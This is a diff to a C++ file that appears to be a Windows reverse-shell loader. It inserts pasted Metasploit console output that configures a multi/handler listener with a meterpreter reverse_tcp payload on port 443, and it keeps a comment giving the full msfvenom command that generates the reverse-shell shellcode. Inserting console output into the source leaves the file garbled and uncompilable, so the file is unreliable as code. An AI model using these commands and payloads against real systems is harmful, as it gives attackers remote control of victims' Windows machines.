@@ -4,6 +4,21 @@
 #include <iostream>
 #include <windows.h>
 #include <stdio.h> 
+msf6 exploit(multi/handler) > run -j
+
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > set lhost wlan1
+lhost => wlan1
+msf6 exploit(multi/handler) > let lport 443
+[-] Unknown command: let. Did you mean set? Run the help command for more details.
+msf6 exploit(multi/handler) > set lport 443
+lport => 443
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run -j
+
+
 
 //* to compile reverse shell, use msfvenom 
 //... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
